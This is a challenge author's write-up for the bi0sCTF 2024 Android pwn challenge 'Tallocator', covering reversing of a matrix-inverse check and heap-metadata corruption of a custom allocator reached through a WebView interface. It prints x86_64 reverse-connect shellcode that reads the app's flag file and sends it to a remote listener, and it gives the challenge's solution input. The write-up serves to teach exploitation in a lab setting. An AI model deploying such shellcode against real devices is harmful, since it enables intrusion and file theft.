<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tallocator | CTF Writeup</title>
    <meta name="description" content="I created an Android based pwn challenge that involes exploiting a dynamic memory allocator using the webview interface. The challenge inclues the following sec...">
    <link href="/src/index.css" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
    <style>
        body { 
            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
            color: #e0e0e0;
        }
        .code-block {
            background: #1e1e1e;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 1rem;
            overflow-x: auto;
            font-family: 'Courier New', monospace;
        }
        .gradient-text {
            background: linear-gradient(135deg, #f97316, #f59e0b);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        .video-embed { position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; border-radius: 8px; border: 1px solid #374151; background: #0f0f0f; margin: 1.5rem 0; }
        .video-embed iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
        .toc-sidebar {
            position: fixed;
            top: 2rem;
            left: 1rem;
            max-height: calc(100vh - 4rem);
            overflow-y: auto;
            background: #1a1a1a;
            border: 1px solid #374151;
            border-radius: 0.75rem;
            padding: 1.5rem;
            margin-right: 0;
            width: 280px;
            flex-shrink: 0;
            z-index: 10;
        }
        .toc-title {
            font-size: 0.875rem;
            font-weight: 600;
            color: #9ca3af;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            margin-bottom: 1rem;
            border-bottom: 1px solid #374151;
            padding-bottom: 0.5rem;
        }
        .toc-list { list-style: none; padding: 0; margin: 0; }
        .toc-sublist { list-style: none; padding-left: 0.5rem; margin-top: 0.25rem; }
        .toc-item { margin: 0.25rem 0; }
        .toc-level-2 { padding-left: 0.25rem; }
        .toc-level-3 { padding-left: 0.75rem; }
        .toc-level-4 { padding-left: 1.25rem; }
        .toc-link { display: block; color: #9ca3af; text-decoration: none; font-size: 0.875rem; line-height: 1.5; padding: 0.25rem 0; border-radius: 0.25rem; transition: all 0.2s; }
        .toc-link:hover { color: #60a5fa; background: #1f2937; padding-left: 0.5rem; }
        @media (max-width: 1024px) { .toc-sidebar { display: none; } }
        .prose h1 { background: linear-gradient(135deg, #f97316, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; font-size: 2.5rem; font-weight: 800; margin-top: 3rem; margin-bottom: 1.5rem; }
        .prose h2 { background: linear-gradient(135deg, #f97316, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; font-size: 2rem; font-weight: 700; margin-top: 3rem; margin-bottom: 1rem; border-bottom: 2px solid #374151; padding-bottom: 0.5rem; }
        .prose h3 { background: linear-gradient(135deg, #f97316, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; font-size: 1.5rem; font-weight: 600; margin-top: 2rem; margin-bottom: 0.75rem; }
        .prose h4 { background: linear-gradient(135deg, #f97316, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; font-size: 1.25rem; font-weight: 600; margin-top: 1.5rem; margin-bottom: 0.5rem; }
        .prose p { margin-bottom: 1.5rem; line-height: 1.7; color: #d1d5db; }
        .prose strong { color: #f3f4f6; font-weight: 600; }
        .prose code { background: #1e1e1e; color: #fbbf24; padding: 0.25rem 0.5rem; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 0.9em; }
        .prose pre { background: #1e1e1e; border: 1px solid #333; border-radius: 8px; padding: 1.5rem; overflow-x: auto; margin: 2rem 0; }
        .prose pre code { background: transparent; color: #e5e7eb; padding: 0; border-radius: 0; }
        .prose blockquote { background:rgb(93, 45, 26); color:rgb(255, 255, 255); border-left: 4px solid #ff8c00; padding: 1rem 1.25rem; margin: 1.25rem 0; border-radius: calc(var(--radius) - 2px); }
        .prose ul, .prose ol { list-style-color: #ff8c00; list-style-type: disc; list-style-position: outside; margin: 1.5rem 0; padding-left: 2rem; }
        .prose li { margin: 0.5rem 0; color: #d1d5db; }
        .prose li::marker { color: #ff8c00 !important; }
        .prose ol li { list-style-type: decimal; }
        .prose img { border-radius: 8px; margin: 2rem 0; max-width: 100%; }
        .prose hr { border: none; height: 2px; background: linear-gradient(90deg, transparent, #374151, transparent); margin: 3rem 0; }
        .prose a { color: rgb(3, 203, 146); text-decoration: underline; }
        </style>
</head>
<body class="min-h-screen">
    <div class="container mx-auto max-w-7xl px-4 sm:px-6 lg:px-4 py-8 relative">
        <header class="mb-12">
            <a href="/writeups" class="text-emerald-400 hover:text-emerald-300 mb-4 inline-block">← Back</a>
            <h1 class="text-4xl md:text-5xl font-bold mb-4">
                <span class="gradient-text">Tallocator</span>
            </h1>
            <div class="mb-8"><img src="/writeups/tallocator-[bi0sCTF]/featured.png" alt="Tallocator cover image" class="w-full h-64 md:h-80 object-cover rounded-lg shadow" loading="eager"></div>
            <div class="flex items-center gap-4 text-sm text-gray-400 mb-6">
                <span>February 1, 2024</span>
                <span>•</span>
                <span>13 min read</span>
                <span>•</span><span>bi0sCTF 2024</span>
                <span>•</span><span>hard</span>
                <span>•</span><span>995 pts</span>
                <span>•</span><div class="flex gap-2"><span class="bg-blue-500/20 text-blue-300 px-2 py-1 rounded text-xs">bi0sctf</span> <span class="bg-blue-500/20 text-blue-300 px-2 py-1 rounded text-xs">Android</span> <span class="bg-blue-500/20 text-blue-300 px-2 py-1 rounded text-xs">Reverse_Shell</span></div>
            </div>
        </header>

        <div class="flex flex-col lg:flex-row justify-start gap-6">
            <aside class="hidden lg:block"><nav class="toc-sidebar"><h3 class="toc-title">Table of Contents</h3><ul class="toc-list"><ul class="toc-sublist"><li class="toc-item toc-level-2"><a href="#challenge-author" class="toc-link">Challenge Author:</a></li><li class="toc-item toc-level-2"><a href="#challenge-description" class="toc-link">Challenge Description:</a></li><li class="toc-item toc-level-2"><a href="#challenge-file" class="toc-link">Challenge File:</a></li><li class="toc-item toc-level-2"><a href="#general" class="toc-link">General:</a></li><li class="toc-item toc-level-2"><a href="#introduction-the-app" class="toc-link">Introduction: The App:</a></li><li class="toc-item toc-level-2"><a href="#debugging-with-gdberver" class="toc-link">Debugging with gdberver:</a></li><li class="toc-item toc-level-2"><a href="#reversing-the-nativec" class="toc-link">Reversing the native.c:</a></li><li class="toc-item toc-level-2"><a href="#exploiting-the-tallocatorc" class="toc-link">Exploiting the tallocator.c:</a></li><ul class="toc-sublist"><li class="toc-item toc-level-3"><a href="#essentials" class="toc-link">Essentials:</a></li><li class="toc-item toc-level-3"><a href="#talloc" class="toc-link">talloc:</a></li><li class="toc-item toc-level-3"><a href="#tree" class="toc-link">tree:</a></li><li class="toc-item toc-level-3"><a href="#other" class="toc-link">other:</a></li><li class="toc-item toc-level-3"><a href="#helper-functions" class="toc-link">Helper Functions:</a></li><li class="toc-item toc-level-3"><a href="#bug" class="toc-link">Bug:</a></li></ul><li class="toc-item toc-level-2"><a href="#writing-reverse-shellcode" class="toc-link">Writing Reverse Shellcode:</a></li><li class="toc-item toc-level-2"><a href="#exploit-script-with-comments" class="toc-link">Exploit Script with comments:</a></li><li class="toc-item toc-level-2"><a href="#closing-note" class="toc-link">Closing Note:</a></li></ul></ul></nav></aside>
            <article class="prose prose-invert max-w-none ml-0 lg:max-w-6xl lg:ml-10">
<p>I created an Android based pwn challenge that involes exploiting a dynamic memory allocator using the webview interface. </p>
<!--more-->
<p>The challenge inclues the following sections:</p>
<ul>
<li>native.c:<ul>
<li>Reverse engineering matrix operations performed.</li></ul></li>
<li>tallocator.c: <ul>
<li>Exploiting an arbitrary free to corrupt heap metadata.</li>
<li>Reverse shellcode to execute an ORW. </li></ul></li>
</ul>
<p><strong>Challenge Points:</strong> 995<br />
<strong>Solves:</strong> 4</p>
<h2 id="challenge-author">Challenge Author:</h2>
<ul>
<li><a href="https://twitter.com/tourpran">tourpran</a>: Memory Allocator Exploitation, tallocator.c</li>
<li><a href="https://twitter.com/the_m3chanic_">the.m3chanic</a>: Reverse Engineering, native.c</li>
<li><a href="https://x.com/r_srikesh">k0m1</a>: General Android Dev</li>
</ul>
<h2 id="challenge-description">Challenge Description:</h2>
<p>Built our enhanced memory allocator, designed specifically for admins and prioritizing both speed and security. Experience the boost in performance firsthand with our website speed tester.</p>
<h2 id="challenge-file">Challenge File:</h2>
<ul>
<li><a href="https://drive.google.com/file/d/1dImmDf4uCWRpCMYQYLxKMxhBwOwiqh6i/view?usp=sharing">Primary Link</a></li>
<li><a href="https://1drv.ms/u/s!AnRA0IqCqZajjS2Y-qQWoo545mQ6?e=QLNoKa">Mirror Link</a></li>
</ul>
<h2 id="general">General:</h2>
<p>First time, creating an android X pwn challenge, it was pretty fun and straight forward to solve. This challenge was inspired from <a href="https://fineas.github.io/FeDEX/post/tridroid.html">google CTF: TRIDROID</a>. If you are new to this, I heavily recomend going through that first. We will go in this specific order to solve the challenge.</p>
<ul>
<li><a href="#Debugging-with-gdberver">Debugging with gdbserver</a></li>
<li><a href="#Reversing-the-native-c">Reversing the native.c</a></li>
<li><a href="#Exploiting-the-tallocator-c">Exploiting the tallocator.c</a></li>
<li><a href="#Writing-Reverse-Shellcode">Writing Reverse Shellcode</a></li>
<li><a href="#Exploit-Script-with-comments">Packing the Exploit</a></li>
</ul>
<h2 id="introduction-the-app">Introduction: The App:</h2>
<ul>
<li>Lets start analyzing the application from <code>AndroidManifest.xml</code> by throwing our application into <strong>JADX</strong>. </li>
<li>The application has a very simple working with just one activity <code>MainActivity</code> and also has Internet Permission. </li>
</ul>
<blockquote>
  <p>Looking into <code>MainActivity.java</code></p>
</blockquote>
<pre><code class="java language-java">    @Override
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(R.layout.activity_main);
        this.w = (WebView) findViewById(R.id.webView);
        this.b = new BroadcastReceiver() {
            @Override // android.content.BroadcastReceiver
            public void onReceive(Context context, Intent intent) {
                if (Objects.equals(intent.getAction(), MainActivity.INTENT1)) {
                    MainActivity.this.w.loadUrl((String) Objects.requireNonNull(intent.getStringExtra("url")));
                }
            }
        };
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction(INTENT1);
        registerReceiver(this.b, intentFilter);
        this.w.getSettings().setJavaScriptEnabled(true);
        this.w.getSettings().setCacheMode(2);
        this.w.addJavascriptInterface(this, "bi0sctf");
        this.w.setWebViewClient(new WebViewClient());
        this.w.setWebChromeClient(new WebChromeClient());
        this.w.loadUrl("http://example.net");
    }
</code></pre>
<ul>
<li>We Could see that this activity has a Webview loading <code>example.net</code>. We can load a custom url using the Dynamic Broadcast Receiver which takes an extra <code>url</code>. </li>
<li>We could notice that a library named <code>tallocator</code> is being loaded and it provides 2 native functions - <code>talloc</code> and <code>tree</code>. </li>
</ul>
<pre><code class="java language-java">    public native long talloc(int i, byte[] bArr);
    public native int tree(long j);
</code></pre>
<ul>
<li>Along with that, this webview provides a <code>JavascriptInterface</code>, whose methods can be accessed via <code>bi0sctf</code> instance. </li>
</ul>
<pre><code class="java language-java">@JavascriptInterface
    public long secure_talloc(String str, int i, byte[] bArr) {
        if (new a().check(str)) {
            return talloc(i, bArr);
        }
        return -1L;
    }

    @JavascriptInterface
    public int secure_tree(String str, long j) {
        if (new a().check(str)) {
            return tree(j);
        }
        return -1;
    }
</code></pre>
<ul>
<li>There are 2 functions that has <code>@JavascriptInterface</code> notation - <code>secure_talloc</code> and <code>secure_tree</code>, which internally accesses the native functions <strong>talloc</strong> and <strong>tree</strong> if we bypass the <code>check</code> method of class <code>a</code>. </li>
</ul>
<blockquote>
  <p>Looking at class <code>a</code>:</p>
</blockquote>
<pre><code class="java language-java">public class a {
    public native boolean check(String str);

    static {
        System.loadLibrary("native");
    }
}
</code></pre>
<ul>
<li>It has just one method <code>check</code> that is being implemented in a JNI Library named <code>native</code>, Which will be covered in the upcoming sections.</li>
</ul>
<h2 id="debugging-with-gdberver">Debugging with gdberver:</h2>
<ul>
<li>Create the android image with the same specifications as given in the script.py (with AVDManager). </li>
</ul>
<pre><code class="py language-py">subprocess.call(
"avdmanager" +
" create avd" +
" --name 'Pixel_4_XL'" +
" --abi 'default/x86_64'" +
" --package 'system-images;android-30;default;x86_64'" +
" --device pixel_4_xl" +
" --force" +
" &gt; /dev/null 2&gt; /dev/null",
env=ENV,close_fds=True,shell=True)
</code></pre>
<ul>
<li>Install the apk into the emulator and run the app. Meanwhile in <code>adb</code> get the pid of the app and attach gdbserver to that pid with port forwarding enabled.</li>
<li>In our machine we just connect gdb to that port using:</li>
</ul>
<pre><code>$ adb forward tcp:7777 tcp:port
$ gdb
$ target remote 127.0.0.1:port
</code></pre>
<ul>
<li>More information on how to work with gdbserver and inpecting memory is given <a href="https://fineas.github.io/FeDEX/post/tridroid.html">here</a>.</li>
</ul>
<h2 id="reversing-the-nativec">Reversing the native.c:</h2>
<p>The working of the.m3chanic's part of the challenge is pretty straightforward. </p>
<p>Let us start by looking at where our input is involved in this</p>
<ul>
<li>First, a floating point array of 4x4 is being initialised, and being passed to a function <code>v4</code></li>
</ul>
<pre><code class="c language-c">void func_1(float a1[4][4])
{
    for (int i = 0; i &lt; 4; i++)
    {
        for (int j = 0; j &lt; 4; j++)
        {
        char c;
        scanf("%c", &amp;c);
        a1[i][j] = (float)c;
        }
    }
}
</code></pre>
<ul>
<li>This function is simple, it's just taking 16 characters as input and storing them as a 2d floating point matrix</li>
<li>Next up it's initialising another 4x4 floating point array, and passing it to another function </li>
</ul>
<blockquote>
  <p>func_7 is as follows</p>
</blockquote>
<pre><code class="c language-c">void func_7(float a1[x][x], float a2[x][x])
{
    int i, j;
    for (i = 0; i &lt; x; i++) {
        for (j = 0; j &lt; x; j++) {
            a2[i][j] = a1[i][j];
        }
    }
}
</code></pre>
<ul>
<li>This function is just copying the matrix to <code>a2</code>, so now <code>v2</code> contains our input </li>
</ul>
<blockquote>
  <p>Next,</p>
</blockquote>
<pre><code class="c language-c">float func_2(int a1, int a2, float a3[a1][a2])
{
    if (a1 != a2) {
        return 0; 
    }

    float v1 = 0;

    if (a1 == 1) {
        v1 = a3[0][0];
    } else {
        for (int i = 0; i &lt; a1; i++) {
            float v2[a1 - 1][a2 - 1];
            for (int j = 1; j &lt; a1; j++) {
                for (int k = 0; k &lt; i; k++) {
                    v2[j - 1][k] = a3[j][k];
                }
                for (int k = i + 1; k &lt; a2; k++) {
                    v2[j - 1][k - 1] = a3[j][k];
                }
            }
            int v3 = (i % 2 == 0) ? 1 : -1;
            v1 += v3 * a3[0][i] * func_2(a1 - 1, a2 - 1, v2);
        }
    }

    return v1;
}
</code></pre>
<ul>
<li>This function is called with arguments (4, 4, input_arr)</li>
<li>It is declaring another floating point array <code>v2</code> (local to this function), of 1 square dimension lesser than our input matrix </li>
</ul>
<blockquote>
  <p>Let's break down this <code>for</code> loop:</p>
</blockquote>
<pre><code class="c language-c">for (int j = 1; j &lt; a1; j++) {
    for (int k = 0; k &lt; i; k++) {
        v2[j - 1][k] = a3[j][k];
    }
    for (int k = i + 1; k &lt; a2; k++) {
        v2[j - 1][k - 1] = a3[j][k];
    }
}
</code></pre>
<ul>
<li>Currently, we know that <code>v2</code> forms some kind of submatrix of the original matrix that we pass in, and that checks out seeing how it is being populated inside this for loop </li>
<li>A float <code>v1</code> is being initialised to 0 as well. </li>
</ul>
<pre><code class="c language-c">int v3 = (i % 2 == 0) ? 1 : -1;
v1 += v3 * a3[0][i] * func_2(a1 - 1, a2 - 1, v2);
</code></pre>
<ul>
<li>Then, based on the index value of i (as in, whether or not it is divisible by 2), it is set to either 1 or -1<br />
And it is multiplied with the current column value of a3 and then multiplied with the return value of <code>func_2</code> but with a smaller sub-matrix</li>
</ul>
<p>If you see through this abstraction a little bit, and try and look at it as an implementation of something already existing, you will quickly realised that <code>func_2</code> is just calculating the determinant of whatever matrix you pass to it<br />
(Some things that give this away are the fact that submatrix is passed on recursively, and -1 is multiplied with the final return value based on the current index, which is the case for determinant also)</p>
<blockquote>
  <p>Next up, a new 4x4 matrix is being initialised and being passed to a function along with our input matrix </p>
</blockquote>
<pre><code class="c language-c">void func_3(int a1, float a2[a1][a1], float a3[a1][a1])
{
    float v1[a1 - 1][a1 - 1];

    for (int i = 0; i &lt; a1; i++)
    {
        for (int j = 0; j &lt; a1; j++)
        {
            int sub_i = 0, sub_j = 0;

            for (int v2 = 0; v2 &lt; a1; v2++)
            {
                if (v2 == i)
                    continue;
                for (int v3 = 0; v3 &lt; a1; v3++)
                {
                    if (v3 == j)
                        continue;

                    v1[sub_i][sub_j] = a2[v2][v3];
                    sub_j++;
                }

                sub_i++;
                sub_j = 0;
            }

            int v4 = (i + j) % 2 == 0 ? 1 : -1;
            a3[i][j] = v4 * func_2(a1 - 1, a1 - 1, v1);
        }
    }
}
</code></pre>
<p>Similar to the previous function, another submatrix is being initialised inside the function and is being populated - again, based on the indices <br />
This one seems straightforward now that we've understood the previous function <br />
It is simply calculating the <code>minor</code> matrix of the matrix passed as argument to it, and is finding the determinant of <em>that</em> matrix. This is the same as finding the <em>cofactor</em> of the given matrix (again, looking at it literally might not make sense at first, but once you try and think of it as an implementation of something else, the dots will start connecting).</p>
<blockquote>
  <p>Next function </p>
</blockquote>
<pre><code class="c language-c">void func_4(int a1, int a2, float a3[a1][a2], float a4[a2][a1])
{
    for (int i = 0; i &lt; a1; i++)
    {
        for (int j = 0; j &lt; a2; j++)
        {
            a4[j][i] = a3[i][j];
        }
    }
}
</code></pre>
<ul>
<li><p>This one is simple, it just transposes the matrix you give it as input <br />
Now, I think you can start seeing the full picture as well </p></li>
<li><p>First, we found the determinant of the matrix, next we found the cofactor matrix and transposed it (Keep in mind, transpose of the cofactor matrix is the same as finding the <em>adjoint</em> of a given matrix)</p></li>
<li><p>Next up, it's taking the adjoint of the matrix we input, and dividing it with the determinant we found of it earlier</p></li>
</ul>
<pre><code class="c language-c">void inverse_matrix(int N, float matrix[N][N], float inverse[N][N], int det, float cofactor[N][N])
{

    for (int i = 0; i &lt; N; i++)
    {
        for (int j = 0; j &lt; N; j++)
        {
            inverse[i][j] = (float) (cofactor[j][i] / det);
        }
    }
}
</code></pre>
<ul>
<li><p>This is the same formula as finding the <em>inverse</em> of a given matrix ;)</p></li>
<li><p>And finally, the inverse of our matrix is being compared with a precalculated inverse <br />
By property, (A⁻¹)⁻¹ == A itself, so all we need to do is find the inverse of the precalculated matrix </p></li>
</ul>
<p>Finding that, and rounding off the numbers appropriately and converting them to their ascii characters will give us this as the valid input: <code>50133tbd5mrt1769</code><br />
And now we can proceed to the rest of the challenge! :)</p>
<h2 id="exploiting-the-tallocatorc">Exploiting the tallocator.c:</h2>
<p>It is pretty straight forward to reverse engineer the talloc/tree functions that act similar to the malloc/free. So, I will be using my source code to explain things more clearly. Lets start off with a quick code run through…</p>
<h3 id="essentials">Essentials:</h3>
<pre><code class="c language-c">int init_talloc(){
    if(init_called == true){
        return 0;
    }

    runDebug = mmap((void*)0x41410000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    init_called = true;
    HeapStart = sbrk(0x1000);

    PUT(HeapStart+8, 0x30);
    PUT(HeapStart+0x38, (0x1000 - 0x38));
    PUT(HeapStart+0x20, 0x3a63);
    top_chunk = HeapStart + 0x38;
}
</code></pre>
<ul>
<li>In <code>init_talloc</code>, we can see that the <code>runDebug</code> is set to a mmapped region with RWX permisions, which has an addres of <code>0x41410000</code>.</li>
<li>Rest, initializes the Heapstart and topchunk to their appropriate values after an sbrk syscall. </li>
</ul>
<h3 id="talloc">talloc:</h3>
<pre><code class="c language-c">Debugger_talloc = *(long long *)(HeapStart+40);
if(Debugger_talloc != 0){
    void (*call_debugger)() = (void (*)())Debugger_talloc;
    call_debugger();
    perror("Debugger called !!");
}
</code></pre>
<ul>
<li>Quickly checks if the <code>Debugger_talloc</code> is set to NULL, otherwise it jumps to whatever it is pointing to. </li>
</ul>
<pre><code class="c language-c">if(alloc_size &lt;= 0x150 &amp;&amp; (ull *)HEAD_SHORT != 0){
    void* curr_ptr = (void *)HEAD_SHORT;
    int cnt = 0;
    while(curr_ptr != NULL &amp;&amp; cnt != 20){

        if(GETSIZE(curr_ptr) &gt;= alloc_size &amp;&amp; abs(alloc_size-GETSIZE(curr_ptr)) &lt; best_size){
            best_size = abs(alloc_size - GETSIZE(curr_ptr));
            ptr = (ull*)curr_ptr;
        }
        curr_ptr = (ull *)*(ull *)(curr_ptr);
        cnt += 1;
    }
    if(ptr != 0 &amp;&amp; GET_FWD(ptr) != 0){
        SET_BKD(GET_FWD(ptr), GET_BKD(ptr));
    }
    if(ptr != 0 &amp;&amp; GET_BKD(ptr) != 0){
        SET_FWD(GET_BKD(ptr), GET_FWD(ptr));
    }
    if((ull)ptr == HEAD_SHORT){
        PUT(&amp;HEAD_SHORT, GET(ptr));
    }
}
</code></pre>
<ul>
<li>Pretty Simple, straight forward use of getting a free chunk.<ul>
<li>Get the <code>HEAD_SHORT</code> from the top of the created heap, iterate through the entire linked_list and keep storing your best fit size and a pointer to that chunk.</li>
<li>Finally unlink that particular chunk from the linked list.</li></ul></li>
<li>The same process is done if the request for the chunk was above the range 0x150, instead updating from the <code>HEAD_LONG</code>.</li>
<li>If no chunk is present in the linked list, it just takes space from the top_chunk.</li>
<li>note: <code>HEAD_LONG</code> and <code>HEAD_SHORT</code> are both stored on top of our entire heap. </li>
</ul>
<h3 id="tree">tree:</h3>
<pre><code class="c language-c">if(chunk_size &lt;= 0x100){
    if(HEAD_SHORT == 0){
        SET_FWD(ptr, 0);
        SET_BKD(ptr, &amp;HEAD_SHORT);
        HEAD_SHORT = (ull)ptr;
        return 0;
    }
    SET_FWD(ptr, HEAD_SHORT);
    SET_BKD(ptr, &amp;HEAD_SHORT);

    SET_BKD(HEAD_SHORT, ptr);
    HEAD_SHORT = (ull)ptr;
}
</code></pre>
<ul>
<li>Essentially, adds it back to the linked list, pointed by <code>HEAD_SHORT</code> and <code>HEAD_LONG</code>.  </li>
</ul>
<h3 id="other">other:</h3>
<pre><code class="c language-c">#define SET_USE(p) *(ull *)(p-8) = (*(ull *)(p-8)) | 0b1
#define SET_FREE(p) *(ull *)(p-8) = (*(ull *)(p-8)) &amp; ~(0b1UL)
</code></pre>
<ul>
<li>Every chunk is 16 bytes aligned, hence I made it so that the last bit in the size_field as either:<ul>
<li>1: currently in use</li>
<li>0: free to use</li></ul></li>
</ul>
<h3 id="helper-functions">Helper Functions:</h3>
<pre><code class="js language-js">function p64(data){ 
    const byteArray = new Uint8Array([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
    let i=0
    while(data &gt; 0){
        byteArray[i] = data&amp;0xff
        data = (data - data%256) / 256
        i = i+1
    }
    return String.fromCharCode.apply(String, byteArray)
}
function fin(data){
    const byte_array = []
    for (const character of data) {
        const code = character.charCodeAt(0)
        byte_array.push(code)
    }
    return byte_array
}
function u64(data){ 
    return parseInt(data.match(/../g).reverse().join(''), 16)
}
</code></pre>
<ul>
<li>Helps converting the 8 byte data stream in little endian to write specific address into memory.</li>
</ul>
<h3 id="bug">Bug:</h3>
<ul>
<li>We are able to free arbitrary pointers eventough it has some basic restrictions. Hence, Forging a fake chunk and using that to access the free list pointers on top of the heap. </li>
<li>Manipulating the free_list pointers will get us to arbitrary write and hence writing out shellcode into the RWX region. This was the main aim of the challenge.</li>
</ul>
<h2 id="writing-reverse-shellcode">Writing Reverse Shellcode:</h2>
<ul>
<li>Create a socket.</li>
<li>Establish a connection to the ip, port that you have a listening port open on.</li>
<li>Finally do Open, Read, Write, to the opened socket to print out the flag.</li>
</ul>
<pre><code class="asm language-asm">global _start
section .text

_start:
socket:
    push 0x29
    pop rax
    push 0x02
    pop rdi
    push 0x01
    pop rsi
    xor edx, edx
    syscall

    mov r9, rax

connect:
    push 0x2a
    pop rax

    mov rdi, r9

    ; creating sockaddr data structure
    push rdx            ; pushing padding
    push rdx

    push 0xdeadbeef     ; pushing INADDR_ANY
    push word 0x3905    ; pushing PORT: 1337
    push word 0x0002    ; pushing AF_INET

    mov rsi, rsp
    add rdx, 0x10
    syscall

open:
    mov rax, 2
    mov r8, 0x0000000000000067
    push r8
    mov r8, 0x616c662f65676e65
    push r8
    mov r8, 0x6c6c6168632e6469
    push r8
    mov r8, 0x6f72646e612e6674
    push r8
    mov r8, 0x63733069622f6174
    push r8
    mov r8, 0x61642f617461642f
    push r8
    mov rdi, rsp
    mov rsi, 0
    mov rdx, 0
    syscall

read:
    mov rdi, rax
    mov rax, 0
    mov rsi, rsp
    mov rdx, 0x50
    syscall

write:
    mov rax, 0x1
    mov rdi, r9
    mov rsi, rsp
    mov rdx, 0x50
    syscall

finish:
    push 0x3c
    pop rax
    syscall

path: db "/data/data/bi0sctf.android.challenge/flag", 0
</code></pre>
<h2 id="exploit-script-with-comments">Exploit Script with comments:</h2>
<blockquote>
  <p>Receiveing the Flag on the listening port:</p>
</blockquote>
<p><img src="/images/tallocator/image-3.png" alt="alt text" /></p>
<blockquote>
  <p>Quick Mind Map:</p>
</blockquote>
<p><img src="/images/tallocator/image.png" alt="bob" /></p>
<ul>
<li>The Final exploit to exploit can be found <a href="https://gist.github.com/tourpran/e18490a2d4790befcb2d18e3c18b16ae">here</a></li>
</ul>
<h2 id="closing-note">Closing Note:</h2>
<p>Congrats to <code>The Flat Network Society</code> for first blooding the challenge. Hope you guys had fun solving the challenge!</p>
            </article>
        </div>
        <!-- Navigation -->
        <nav class="mt-16 pt-8 border-t border-gray-700">
            <div class="flex justify-between items-center">
                <div class="flex-1">
                    <a href="/writeups/holy-cow---pwnme25.html" class="inline-flex items-center text-emerald-400 hover:text-emerald-300 transition-colors">
                        <svg class="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path>
                        </svg>
                        <div class="text-left">
                            <div class="text-xs text-gray-400">Previous</div>
                            <div class="font-medium">holy cow</div>
                        </div>
                    </a>
                </div>
                <div class="flex-1 text-center">
                    <a href="/writeups" class="text-emerald-400 hover:text-emerald-300 transition-colors font-medium">All Writeups</a>
                </div>
                <div class="flex-1 text-right">
                    <a href="/writeups/evalbox---pyjail-writeup.html" class="inline-flex items-center text-emerald-400 hover:text-emerald-300 transition-colors">
                        <div class="text-right">
                            <div class="text-xs text-gray-400">Next</div>
                            <div class="font-medium">evalbox - pyjail writeup</div>
                        </div>
                        <svg class="w-4 h-4 ml-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path>
                        </svg>
                    </a>
                </div>
            </div>
        </nav>
        </nav>
    </div>
<script>window.addEventListener('DOMContentLoaded',()=>{try{document.querySelectorAll('pre code').forEach((el)=>window.hljs&&window.hljs.highlightElement(el));}catch(e){console.warn('hljs init failed',e);}});</script>
</body>
</html>